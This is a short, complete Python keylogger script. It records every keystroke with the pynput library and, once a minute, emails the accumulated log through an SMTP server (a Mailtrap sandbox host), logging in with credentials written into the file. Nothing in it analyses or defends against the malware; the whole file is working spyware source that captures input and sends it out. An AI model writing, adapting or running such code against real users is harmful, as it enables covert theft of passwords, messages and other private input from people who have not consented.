import smtplib
import threading
from pynput import keyboard

EMAIL_ADDRESS = "4651c4222c6dad"
EMAIL_PASSWORD = "f2af636e9cf4fc"
SEND_REPORT_EVERY = 60  # Time interval in seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = ""
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log += string

    def on_press(self, key):
        try:
            self.append_log(str(key.char))
        except AttributeError:
            if key == key.space:
                self.append_log(" ")
            else:
                self.append_log(f" [{str(key)}] ")

    def send_mail(self, email, password, message):
        sender = email
        receiver = email

        msg = f"""\
Subject: Keylogger Report
To: {receiver}
From: {sender}

{message}
"""
        with smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.sendmail(sender, receiver, msg)

    def report(self):
        if self.log:
            self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
